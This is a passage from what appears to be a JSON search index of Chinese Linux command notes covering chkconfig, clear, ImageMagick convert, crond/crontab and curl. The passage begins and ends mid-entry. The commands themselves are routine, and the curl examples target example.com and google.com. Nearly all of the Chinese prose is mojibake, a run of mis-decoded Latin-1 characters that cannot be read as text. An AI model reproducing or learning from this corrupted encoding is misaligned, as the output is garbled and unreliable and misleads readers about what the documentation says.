æ›´ç®€å•ä¸€ç‚¹ï¼Œchkconfigæ˜¯ä¸€ä¸ªç”¨äºç»´æŠ¤/etc/rc[0-6].dç›®å½•çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ å¸¸è§ç”¨æ³• ç”¨æ³•: chkconfig [--list] [--type <ç±»å‹>] [åç§°] chkconfig --add <åç§°> chkconfig --del <åç§°> chkconfig --override <åç§°> chkconfig [--level <çº§åˆ«>] [--type <ç±»å‹>] <åç§°> <on|off|reset|resetpriorities> è®¾ç½®serviceå¼€æœºæ˜¯å¦å¯åŠ¨: chkconfig name on/off/reset onã€offã€resetç”¨äºæ”¹å˜serviceçš„å¯åŠ¨ä¿¡æ¯. onè¡¨ç¤ºå¼€å¯ï¼Œoffè¡¨ç¤ºå…³é—­ï¼Œresetè¡¨ç¤ºé‡ç½®ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œonå’Œoffå¼€å…³åªå¯¹è¿è¡Œçº§2ï¼Œ3ï¼Œ4ï¼Œ5æœ‰æ•ˆï¼Œresetå¯ä»¥å¯¹æ‰€æœ‰è¿è¡Œçº§æœ‰æ•ˆã€‚ æ³¨è§£ åœ¨Redhat7ä¸Šï¼Œè¿è¡Œchkconfigå‘½ä»¤ï¼Œéƒ½ä¼šè¢«è½¬åˆ°systemcleå‘½ä»¤ä¸Šã€‚ è®¾ç½®serviceè¿è¡Œçº§åˆ«: chkconfig --level levels æŒ‡å®šæœåŠ¡çš„è¿è¡Œçº§åˆ«ï¼Œå³æŒ‡å®šè¿è¡Œçº§åˆ«2,3,4,5ç­‰(å³ init çš„è¿è¡Œçº§åˆ«): 0ï¼š- å…³æœº 1ï¼šå•ç”¨æˆ·æ¨¡å¼ 2ï¼šæ— ç½‘ç»œè¿æ¥çš„å¤šç”¨æˆ·å‘½ä»¤è¡Œæ¨¡å¼ 3ï¼šæœ‰ç½‘ç»œè¿æ¥çš„å¤šç”¨æˆ·å‘½ä»¤è¡Œæ¨¡å¼ 4ï¼šä¸å¯ç”¨ 5ï¼šå¸¦å›¾å½¢ç•Œé¢çš„å¤šç”¨æˆ·æ¨¡å¼ 6ï¼šé‡æ–°å¯åŠ¨ åˆ—å‡ºserviceå¯åŠ¨ä¿¡æ¯: chkconfig --list [name] å¦‚æœä¸æŒ‡å®šnameï¼Œä¼šåˆ—å‡ºæ‰€æœ‰servicesçš„ä¿¡æ¯. æ¯ä¸ªserviceæ¯ä¸ªè¿è¡Œçº§åˆ«éƒ½ä¼šæœ‰ä¸€ä¸ªå¯åŠ¨å’Œåœæ­¢è„šæœ¬ï¼› å½“åˆ‡æ¢è¿è¡Œçº§åˆ«æ—¶ï¼Œinitä¸ä¼šé‡å¯å·²ç»å¯åŠ¨çš„serviceï¼Œä¹Ÿä¸ä¼šé‡æ–°åœæ­¢å·²ç»åœæ­¢çš„serviceã€‚ æ¬²æŸ¥çœ‹å¯¹ç‰¹å®š target å¯ç”¨çš„æœåŠ¡è¯·æ‰§è¡Œ: systemctl list-dependencies [target]","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chkconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chkconfig.html"},{"title":"clear","text":"æ¸…å± ä¹Ÿå¯ä½¿ç”¨å¿«æ·é”®ï¼šCtrl + l","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-clear.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-clear.html"},{"title":"convert","text":"è½¬æ¢å›¾ç‰‡æ ¼å¼ï¼Œæ”¯æŒJPG, BMP, PCX, GIF, PNG, TIFF, XPMå’ŒXWDç­‰ç±»å‹ macå®‰è£…: brew install imagemagick è·å–å›¾ç‰‡å°ºå¯¸: identify ABCD.png è¾“å‡º: ABCD.png PNG 339x362 339x362+0+0 8-bit DirectClass 76.2kb è¯´æ˜ï¼šå›¾ç‰‡ABCD.pngçš„æ ¼å¼ä¸ºPNGï¼Œå®½ã€é«˜åˆ†åˆ«ä¸º339å’Œ362ï¼Œä½æ·±åº¦8-bitï¼Œå¤§å°76.2kbï¼›ä¸‹æ–‡ä¸»è¦æ¶‰åŠå®½ã€é«˜çš„ä¿¡æ¯ã€‚ å°†jpegè½¬æˆpngæ–‡ä»¶: convert xxx.jpg xxx.png å°†gifè½¬æ¢æˆbmpå›¾åƒ: convert xxx.gif xxx.bmp å°†tiffè½¬æ¢æˆpcxå›¾åƒ: convert xxx.tiff xxx.pcx å°†å›¾åƒçš„åƒç´ æ”¹ä¸º1024*768ï¼Œæ³¨æ„1024ä¸768ä¹‹é—´æ˜¯å°å†™å­—æ¯x: convert -resize 1024x768 xxx.jpg xxx1.jpg å°†å›¾åƒçš„ç¼©å‡ä¸ºåŸæ¥çš„50%*50%: convert -sample 50%x50% xxx.jpg xxx1.jpg å°†å›¾åƒé¡ºæ—¶é’ˆæ—‹è½¬270åº¦: convert -rotate 270 sky.jpg sky-final.jpg ä½¿ç”¨-drawé€‰é¡¹è¿˜å¯ä»¥åœ¨å›¾åƒé‡Œé¢æ·»åŠ æ–‡å­—: convert -fill black -pointsize 60 -font helvetica -draw 'text 10,80 \"Hello, World!\" â€˜ hello.jpg helloworld.jpg åœ¨å›¾åƒä¸ŠåŠ ä¸Šæ–‡å­—è¯´æ˜, æ¯”å¦‚ç‰ˆæƒ: # æ”¯æŒç”¨ -font æŒ‡å®šå­—ä½“ï¼Œéœ€è¦å®‰è£…Ghostscriptæ”¯æŒ: http://www.cs.wisc.edu/~ghost/ # æˆ–è€…ç”¨ composite å‘½ä»¤åœ¨æ‰€æœ‰å›¾ç‰‡ä¸ŠåŠ ä¸Šæ°´å°: http://www.imagemagick.org/script/composite.php convert 1.png -fill white -pointsize 13 -draw \"text 10,15 â€˜lifesinger 2006ï¼‡\" 2.png å‚è€ƒ:: Linuxä¹‹convertå‘½ä»¤ å·§ç”¨linuxå·¥å…·ä¹‹convertç®€ä»‹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-convert.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-convert.html"},{"title":"crond","text":"crontabæœåŠ¡ Linuxä¸‹çš„ä»»åŠ¡è°ƒåº¦åˆ†ä¸ºä¸¤ç±»ï¼š ç³»ç»Ÿä»»åŠ¡è°ƒåº¦ å’Œ ç”¨æˆ·ä»»åŠ¡è°ƒåº¦ ç³»ç»Ÿä»»åŠ¡è°ƒåº¦ ç³»ç»Ÿå‘¨æœŸæ€§æ‰€è¦æ‰§è¡Œçš„å·¥ä½œï¼Œæ¯”å¦‚å†™ç¼“å­˜æ•°æ®åˆ°ç¡¬ç›˜ã€æ—¥å¿—æ¸…ç†ç­‰ã€‚ åœ¨ /etc ç›®å½•ä¸‹æœ‰ä¸€ä¸ª crontab æ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯ç³»ç»Ÿä»»åŠ¡è°ƒåº¦çš„é…ç½®æ–‡ä»¶ã€‚ /etc/crontab æ–‡ä»¶åŒ…æ‹¬ä¸‹é¢å‡ è¡Œ: SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=\"\"HOME=/ # run-parts 51 * * * * root run-parts /etc/cron.hourly 24 7 * * * root run-parts /etc/cron.daily 22 4 * * 0 root run-parts /etc/cron.weekly 42 4 1 * * root run-parts /etc/cron.monthly å‰å››è¡Œæ˜¯ç”¨æ¥é…ç½®crondä»»åŠ¡è¿è¡Œçš„ç¯å¢ƒå˜é‡ ç¬¬ä¸€è¡ŒSHELLå˜é‡æŒ‡å®šäº†ç³»ç»Ÿè¦ä½¿ç”¨å“ªä¸ªshellï¼Œè¿™é‡Œæ˜¯bash ç¬¬äºŒè¡ŒPATHå˜é‡æŒ‡å®šäº†ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤çš„è·¯å¾„ ç¬¬ä¸‰è¡ŒMAILTOå˜é‡æŒ‡å®šäº†crondçš„ä»»åŠ¡æ‰§è¡Œä¿¡æ¯å°†é€šè¿‡ç”µå­é‚®ä»¶å‘é€ç»™rootç”¨æˆ·ï¼Œ å¦‚æœMAILTOå˜é‡çš„å€¼ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸å‘é€ä»»åŠ¡æ‰§è¡Œä¿¡æ¯ç»™ç”¨æˆ·ï¼Œ ç¬¬å››è¡Œçš„HOMEå˜é‡æŒ‡å®šäº†åœ¨æ‰§è¡Œå‘½ä»¤æˆ–è€…è„šæœ¬æ—¶ä½¿ç”¨çš„ä¸»ç›®å½•ã€‚ ç”¨æˆ·ä»»åŠ¡è°ƒåº¦ ç”¨æˆ·å®šæœŸè¦æ‰§è¡Œçš„å·¥ä½œï¼Œæ¯”å¦‚ç”¨æˆ·æ•°æ®å¤‡ä»½ã€å®šæ—¶é‚®ä»¶æé†’ç­‰ã€‚ ç”¨æˆ·å¯ä»¥ä½¿ç”¨ crontab å·¥å…·æ¥å®šåˆ¶è‡ªå·±çš„è®¡åˆ’ä»»åŠ¡ã€‚ æ‰€æœ‰ç”¨æˆ·å®šä¹‰çš„crontabæ–‡ä»¶éƒ½è¢«ä¿å­˜åœ¨ /var/spool/cron ç›®å½•ä¸­ã€‚ å…¶æ–‡ä»¶åä¸ç”¨æˆ·åä¸€è‡´ï¼Œä½¿ç”¨è€…æƒé™æ–‡ä»¶å¦‚ä¸‹: /etc/cron.deny è¯¥æ–‡ä»¶ä¸­æ‰€åˆ—ç”¨æˆ·ä¸å…è®¸ä½¿ç”¨crontabå‘½ä»¤ /etc/cron.allow è¯¥æ–‡ä»¶ä¸­æ‰€åˆ—ç”¨æˆ·å…è®¸ä½¿ç”¨crontabå‘½ä»¤ /var/spool/cron/ æ‰€æœ‰ç”¨æˆ·crontabæ–‡ä»¶å­˜æ”¾çš„ç›®å½•,ä»¥ç”¨æˆ·åå‘½å crontabæ–‡ä»¶çš„å«ä¹‰ ç”¨æˆ·æ‰€å»ºç«‹çš„crontabæ–‡ä»¶ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½ä»£è¡¨ä¸€é¡¹ä»»åŠ¡ï¼Œæ¯è¡Œçš„æ¯ä¸ªå­—æ®µä»£è¡¨ä¸€é¡¹è®¾ç½®ï¼Œå®ƒ çš„æ ¼å¼å…±åˆ†ä¸ºå…­ä¸ªå­—æ®µï¼Œå‰äº”æ®µæ˜¯æ—¶é—´è®¾å®šæ®µï¼Œç¬¬å…­æ®µæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤æ®µï¼Œæ ¼å¼å¦‚ä¸‹: minute hour day month week command é¡ºåºï¼šåˆ† æ—¶ æ—¥ æœˆ å‘¨ å…¶ä¸­ï¼š minuteï¼š è¡¨ç¤ºåˆ†é’Ÿï¼Œå¯ä»¥æ˜¯ä»0åˆ°59ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚ hourï¼šè¡¨ç¤ºå°æ—¶ï¼Œå¯ä»¥æ˜¯ä»0åˆ°23ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚ dayï¼šè¡¨ç¤ºæ—¥æœŸï¼Œå¯ä»¥æ˜¯ä»1åˆ°31ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚ monthï¼šè¡¨ç¤ºæœˆä»½ï¼Œå¯ä»¥æ˜¯ä»1åˆ°12ä¹‹é—´çš„ä»»ä½•æ•´æ•°ã€‚ weekï¼šè¡¨ç¤ºæ˜ŸæœŸå‡ ï¼Œå¯ä»¥æ˜¯ä»0åˆ°7ä¹‹é—´çš„ä»»ä½•æ•´æ•°ï¼Œè¿™é‡Œçš„0æˆ–7ä»£è¡¨æ˜ŸæœŸæ—¥ã€‚ commandï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±ç¼–å†™çš„è„šæœ¬æ–‡ä»¶ã€‚ åœ¨ä»¥ä¸Šå„ä¸ªå­—æ®µä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š æ˜Ÿå·ï¼ˆ*ï¼‰ï¼šä»£è¡¨æ‰€æœ‰å¯èƒ½çš„å€¼ï¼Œä¾‹å¦‚monthå­—æ®µå¦‚æœæ˜¯æ˜Ÿå·ï¼Œåˆ™è¡¨ç¤ºåœ¨æ»¡è¶³å…¶å®ƒå­—æ®µçš„åˆ¶çº¦æ¡ä»¶åæ¯æœˆéƒ½æ‰§è¡Œè¯¥å‘½ä»¤æ“ä½œã€‚ é€—å·ï¼ˆ,ï¼‰ï¼šå¯ä»¥ç”¨é€—å·éš”å¼€çš„å€¼æŒ‡å®šä¸€ä¸ªåˆ—è¡¨èŒƒå›´ï¼Œä¾‹å¦‚ï¼Œ\"1,2,5,7,8,9\" ä¸­æ ï¼ˆ-ï¼‰ï¼šå¯ä»¥ç”¨æ•´æ•°ä¹‹é—´çš„ä¸­æ è¡¨ç¤ºä¸€ä¸ªæ•´æ•°èŒƒå›´ï¼Œä¾‹å¦‚\"2-6\"è¡¨ç¤º\"2,3,4,5,6\" æ­£æ–œçº¿ï¼ˆ/ï¼‰ï¼šå¯ä»¥ç”¨æ­£æ–œçº¿æŒ‡å®šæ—¶é—´çš„é—´éš”é¢‘ç‡ï¼Œä¾‹å¦‚\"0-23/2\"è¡¨ç¤ºæ¯ä¸¤å°æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚åŒæ—¶æ­£æ–œçº¿å¯ä»¥å’Œæ˜Ÿå·ä¸€èµ·ä½¿ç”¨ï¼Œä¾‹å¦‚*/10ï¼Œå¦‚æœç”¨åœ¨minuteå­—æ®µï¼Œè¡¨ç¤ºæ¯ååˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚ crondæœåŠ¡-æŒ‡ä»¤ å¸¸ç”¨: /sbin/service crond start # å¯åŠ¨æœåŠ¡ /sbin/service crond stop # å…³é—­æœåŠ¡ /sbin/service crond restart # é‡å¯æœåŠ¡ /sbin/service crond reload # é‡æ–°è½½å…¥é…ç½® æŸ¥çœ‹crontabæœåŠ¡çŠ¶æ€: service crond status æ‰‹åŠ¨å¯åŠ¨crontabæœåŠ¡: service crond start æŸ¥çœ‹crontabæœåŠ¡æ˜¯å¦å·²è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤: ntsysv åŠ å…¥å¼€æœºè‡ªåŠ¨å¯åŠ¨: chkconfig â€“level 35 crond on centosç‰ˆæœ¬é€‚ç”¨ cronè¡¨è¾¾å¼ä¸­é—®å·(?)çš„ä½¿ç”¨ cronè¡¨è¾¾å¼è¯¦è§£å…¶ä¸­é—®å· ? åªèƒ½ç”¨åœ¨ DayofMonth å’Œ DayofWeek ä¸¤ä¸ªåŸŸï¼Œ ç”±äºæŒ‡å®šæ—¥æœŸ( DayofMonth )å’ŒæŒ‡å®šæ˜ŸæœŸ( DayofWeek )å­˜åœ¨å†²çªï¼Œ æ‰€ä»¥å½“æŒ‡å®šäº†æ—¥æœŸ( DayofMonth )åï¼ˆåŒ…æ‹¬æ¯å¤©ï¼‰ï¼Œæ˜ŸæœŸ( DayofWeek )å¿…é¡»ä½¿ç”¨ ? ï¼Œ åŒç†ï¼ŒæŒ‡å®šæ˜ŸæœŸ( DayofWeek )åï¼Œæ—¥æœŸ( DayofMonth )å¿…é¡»ä½¿ç”¨é—®å· ? .","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-crond.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-crond.html"},{"title":"curl","text":"curl æ˜¯å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨æ¥è¯·æ±‚ Web æœåŠ¡å™¨ã€‚ å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚ å®ƒçš„åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œå‘½ä»¤è¡Œå‚æ•°å¤šè¾¾å‡ åç§ã€‚å¦‚æœç†Ÿç»ƒçš„è¯ï¼Œå®Œå…¨å¯ä»¥å–ä»£ Postman è¿™ä¸€ç±»çš„å›¾å½¢ç•Œé¢å·¥å…·ã€‚ ä¸å¸¦æœ‰ä»»ä½•å‚æ•°æ—¶ï¼Œcurl å°±æ˜¯å‘å‡º GET è¯·æ±‚: $ curl https://www.example.com -A -A å‚æ•°æŒ‡å®šå®¢æˆ·ç«¯çš„ç”¨æˆ·ä»£ç†æ ‡å¤´ï¼Œå³ User-Agent . curl çš„é»˜è®¤ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²æ˜¯ curl/[version] å°† User-Agent æ”¹æˆ Chrome æµè§ˆå™¨: $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com ç§»é™¤ User-Agent æ ‡å¤´: $ curl -A '' https://google.com ä¹Ÿå¯ä»¥é€šè¿‡ -H å‚æ•°ç›´æ¥æŒ‡å®šæ ‡å¤´ï¼Œæ›´æ”¹ User-Agent : $ curl -H 'User-Agent: php/1.0' https://google.com -b -b å‚æ•°ç”¨æ¥å‘æœåŠ¡å™¨å‘é€ Cookie ç”Ÿæˆä¸€ä¸ªæ ‡å¤´`Cookie: foo=bar`ï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåä¸º`foo`ã€å€¼ä¸º`bar`çš„ Cookie: $ curl -b 'foo=bar' https://google.com å‘é€ä¸¤ä¸ª Cookie: $ curl -b 'foo1=bar;foo2=bar2' https://google.com è¯»å–æœ¬åœ°æ–‡ä»¶`cookies.txt`ï¼Œé‡Œé¢æ˜¯æœåŠ¡å™¨è®¾ç½®çš„ Cookieï¼ˆå‚è§`-c`å‚æ•°ï¼‰ï¼Œå°†å…¶å‘é€åˆ°æœåŠ¡å™¨: $ curl -b cookies.txt https://www.google.com -c -c å‚æ•°å°†æœåŠ¡å™¨è®¾ç½®çš„ Cookie å†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ å°†æœåŠ¡å™¨çš„ HTTP å›åº”æ‰€è®¾ç½® Cookie å†™å…¥æ–‡æœ¬æ–‡ä»¶ cookies.txt : $ curl -c cookies.txt https://www.google.com -d -d å‚æ•°ç”¨äºå‘é€ POST è¯·æ±‚çš„æ•°æ®ä½“ ä½¿ç”¨`-d`å‚æ•°ä»¥åï¼ŒHTTP è¯·æ±‚ä¼šè‡ªåŠ¨åŠ ä¸Šæ ‡å¤´ Content-Type : application/x-www-form-urlencoded ã€‚ å¹¶ä¸”ä¼šè‡ªåŠ¨å°†è¯·æ±‚è½¬ä¸º POST æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥çœç•¥ -X POST : $ curl -d'login=emmaï¼†password=123'-X POST https://google.com/login # æˆ–è€… $ curl -d 'login=emma' -d 'password=123' -X POST https://google.com/login -d å‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡æœ¬æ–‡ä»¶çš„æ•°æ®ï¼Œå‘æœåŠ¡å™¨å‘é€. å¦‚è¯»å–`data.txt`æ–‡ä»¶çš„å†…å®¹ï¼Œä½œä¸ºæ•°æ®ä½“å‘æœåŠ¡å™¨å‘é€: $ curl -d '@data.txt' https://google.com/login --data-urlencode --data-urlencode å‚æ•°ç­‰åŒäº -d ï¼Œå‘é€ POST è¯·æ±‚çš„æ•°æ®ä½“ï¼Œ åŒºåˆ«åœ¨äºä¼šè‡ªåŠ¨å°†å‘é€çš„æ•°æ®è¿›è¡Œ URL ç¼–ç ã€‚ å‘é€çš„æ•°æ® hello world ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œéœ€è¦è¿›è¡Œ URL ç¼–ç : $ curl --data-urlencode 'comment=hello world' https://google.com/login -e è®¾ç½® HTTP çš„æ ‡å¤´ Referer ï¼Œè¡¨ç¤ºè¯·æ±‚çš„æ¥æºã€‚ å°†`Referer`æ ‡å¤´è®¾ä¸º https://google.com?q=example : curl -e 'https://google.com?q=example' https://www.example.com -H`å‚æ•°å¯ä»¥é€šè¿‡ç›´æ¥æ·»åŠ æ ‡å¤´`Referer ï¼Œè¾¾åˆ°åŒæ ·æ•ˆæœ: curl -H 'Referer: https://google.com?q=example' https://www.example.com -F å‘æœåŠ¡å™¨ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶ ç»™ HTTP è¯·æ±‚åŠ ä¸Šæ ‡å¤´`Content-Type: multipart/form-data`ï¼Œç„¶åå°†æ–‡ä»¶`photo.png`ä½œä¸º`file`å­—æ®µä¸Šä¼ : $ curl -F 'file=@photo.png' https://google.com/profile -F å‚æ•°å¯ä»¥æŒ‡å®š MIME ç±»å‹ã€‚ å¦‚æŒ‡å®š MIME ç±»å‹ä¸º`image/png`ï¼Œå¦åˆ™ curl ä¼šæŠŠ MIME ç±»å‹è®¾ä¸º application/octet-stream : $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile -F`å‚æ•°ä¹Ÿå¯ä»¥æŒ‡å®šæ–‡ä»¶åã€‚ å¦‚åŸå§‹æ–‡ä»¶åä¸º`photo.png ï¼Œä½†æ˜¯æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ–‡ä»¶åä¸º me.png : $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile -G æ„é€  URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ å‘å‡ºä¸€ä¸ª GET è¯·æ±‚ï¼Œå®é™…è¯·æ±‚çš„ URL ä¸º`https://google.com/search?q=kitties&count=20`ã€‚å¦‚æœçœç•¥`--G`ï¼Œä¼šå‘å‡ºä¸€ä¸ª POST è¯·æ±‚: $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search å¦‚æœæ•°æ®éœ€è¦ URL ç¼–ç ï¼Œå¯ä»¥ç»“åˆ --data--urlencode å‚æ•°: $ curl -G --data-urlencode 'comment=hello world' https://www.example.com -H æ·»åŠ  HTTP è¯·æ±‚çš„æ ‡å¤´ã€‚ æ·»åŠ  HTTP æ ‡å¤´ Accept-Language: en-US : $ curl -H 'Accept-Language: en-US' https://google.com æ·»åŠ ä¸¤ä¸ª HTTP æ ‡å¤´: $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com æ·»åŠ  HTTP è¯·æ±‚çš„æ ‡å¤´æ˜¯ Content-Type: application/json ï¼Œç„¶åç”¨`-d`å‚æ•°å‘é€ JSON æ•°æ®: $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login -i æ‰“å°å‡ºæœåŠ¡å™¨å›åº”çš„ HTTP æ ‡å¤´ æ”¶åˆ°æœåŠ¡å™¨å›åº”åï¼Œå…ˆè¾“å‡ºæœåŠ¡å™¨å›åº”çš„æ ‡å¤´ï¼Œç„¶åç©ºä¸€è¡Œï¼Œå†è¾“å‡ºç½‘é¡µçš„æºç : $ curl -i https://www.example.com -I å‘æœåŠ¡å™¨å‘å‡º HEAD è¯·æ±‚ï¼Œç„¶ä¼šå°†æœåŠ¡å™¨è¿”å›çš„ HTTP æ ‡å¤´æ‰“å°å‡ºæ¥ã€‚ è¾“å‡ºæœåŠ¡å™¨å¯¹ HEAD è¯·æ±‚çš„å›åº”: $ curl -I https://www.example.com --head`å‚æ•°ç­‰åŒäº `-I : $ curl --head https://www.example.com -k æŒ‡å®šè·³è¿‡ SSL æ£€æµ‹ã€‚ ä¸ä¼šæ£€æŸ¥æœåŠ¡å™¨çš„ SSL è¯ä¹¦æ˜¯å¦æ­£ç¡®: $ curl -k https://www.example.com -L è®© HTTP è¯·æ±‚è·ŸéšæœåŠ¡å™¨çš„é‡å®šå‘ã€‚ curl é»˜è®¤ä¸è·Ÿéšé‡å®šå‘: $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet --limit-rate --limit-rate é™åˆ¶ HTTP è¯·æ±‚å’Œå›åº”çš„å¸¦å®½ï¼Œæ¨¡æ‹Ÿæ…¢ç½‘é€Ÿçš„ç¯å¢ƒ å°†å¸¦å®½é™åˆ¶åœ¨æ¯ç§’ 200K å­—èŠ‚: $ curl --limit-rate 200k https://google.com -o -o å‚æ•°å°†æœåŠ¡å™¨çš„å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œç­‰åŒäº wget å‘½ä»¤ å°† www.example.com ä¿å­˜æˆ example.html : $ curl -o example.html https://www.example.com -O -O å‚æ•°å°†æœåŠ¡å™¨å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œå¹¶å°† URL çš„æœ€åéƒ¨åˆ†å½“ä½œæ–‡ä»¶åã€‚ å°†æœåŠ¡å™¨å›åº”ä¿å­˜æˆæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸º bar.html : $ curl -O https://www.example.com/foo/bar.html -s -s å‚æ•°å°†ä¸è¾“å‡ºé”™è¯¯å’Œè¿›åº¦ä¿¡æ¯ ä¸€æ—¦å‘ç”Ÿé”™è¯¯ï¼Œä¸ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚ä¸å‘ç”Ÿé”™è¯¯çš„è¯ï¼Œä¼šæ­£å¸¸æ˜¾ç¤ºè¿è¡Œç»“æœ: $ curl -s https://www.example.com å¦‚æœæƒ³è®© curl ä¸äº§ç”Ÿä»»ä½•è¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤: $ curl -s -o /dev/null https://google.com -S -S`å‚æ•°æŒ‡å®šåªè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œé€šå¸¸ä¸ `-s ä¸€èµ·ä½¿ç”¨ã€‚ å‘½ä»¤æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œé™¤éå‘ç”Ÿé”™è¯¯: $ curl -s -o /dev/null https://google.com -u è®¾ç½®æœåŠ¡å™¨è®¤è¯çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ è®¾ç½®ç”¨æˆ·åä¸º bob ï¼Œå¯†ç ä¸º 12345 ï¼Œ ç„¶åå°†å…¶è½¬ä¸º HTTP æ ‡å¤´ Authorization: Basic Ym9iOjEyMzQ1 : $ curl -u 'bob:12345' https://google.com/login curl èƒ½å¤Ÿè¯†åˆ« URL é‡Œé¢çš„ç”¨æˆ·åå’Œå¯†ç , å°†å…¶è½¬ä¸ºä¸Šä¸ªä¾‹å­é‡Œé¢çš„ HTTP æ ‡å¤´: $ curl https://bob:12345@google.com/login åªè®¾ç½®äº†ç”¨æˆ·åï¼Œæ‰§è¡Œåï¼Œcurl ä¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç : $ curl -u 'bob' https://google.com/login -v è¾“å‡ºé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨äºè°ƒè¯•: $ curl -v https://www.example.com --trace å‚æ•°ä¹Ÿå¯ä»¥ç”¨äºè°ƒè¯•ï¼Œè¿˜ä¼šè¾“å‡ºåŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®: $ curl --trace - https://www.example.com -x -x å‚æ•°æŒ‡å®š HTTP è¯·æ±‚çš„ä»£ç†ã€‚ æŒ‡å®š HTTP è¯·æ±‚é€šè¿‡ myproxy.com:8080 çš„ socks5 ä»£ç†å‘å‡º: $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com å¦‚æœæ²¡æœ‰æŒ‡å®šä»£ç†åè®®ï¼Œé»˜è®¤ä¸º HTTPã€‚ è¯·æ±‚çš„ä»£ç†ä½¿ç”¨ HTTP åè®®: $ curl -x james:cats@myproxy.com:8080 https://www.example.com -X -X å‚æ•°æŒ‡å®š HTTP è¯·æ±‚çš„æ–¹æ³•ã€‚ å¯¹ https://www.example.com å‘å‡º POST è¯·æ±‚: $ curl -X POST https://www.example.com CURLçŠ¶æ€ç åˆ—è¡¨ çŠ¶æ€ç  çŠ¶æ€åŸå›  è§£é‡Š 0 æ­£å¸¸è®¿é—® 1 é”™è¯¯çš„åè®® æœªæ”¯æŒçš„åè®®ã€‚æ­¤ç‰ˆcURL ä¸æ”¯æŒè¿™ä¸€åè®®ã€‚ 2 åˆå§‹åŒ–ä»£ç å¤±è´¥ åˆå§‹åŒ–å¤±è´¥ã€‚ 3 URLæ ¼å¼ä¸æ­£ç¡® URL æ ¼å¼é”™è¯¯ã€‚è¯­æ³•ä¸æ­£ç¡®ã€‚ 4 è¯·æ±‚åè®®é”™è¯¯ 5 æ— æ³•è§£æä»£ç† æ— æ³•è§£æä»£ç†ã€‚æ— æ³•è§£æç»™å®šä»£ç†ä¸»æœºã€‚ 6 æ— æ³•è§£æä¸»æœºåœ°å€ æ— æ³•è§£æä¸»æœºã€‚æ— æ³•è§£æç»™å®šçš„è¿œç¨‹ä¸»æœºã€‚ 7 æ— æ³•è¿æ¥åˆ°ä¸»æœº æ— æ³•è¿æ¥åˆ°ä¸»æœºã€‚ 8 è¿œç¨‹æœåŠ¡å™¨ä¸å¯ç”¨ FTP éæ­£å¸¸çš„æœåŠ¡å™¨åº”ç­”ã€‚cURL æ— æ³•è§£ææœåŠ¡å™¨å‘é€çš„æ•°æ®ã€‚ 9 è®¿é—®èµ„æºé”™è¯¯ FTP è®¿é—®è¢«æ‹’ç»ã€‚æœåŠ¡å™¨æ‹’ç»ç™»å…¥æˆ–æ— 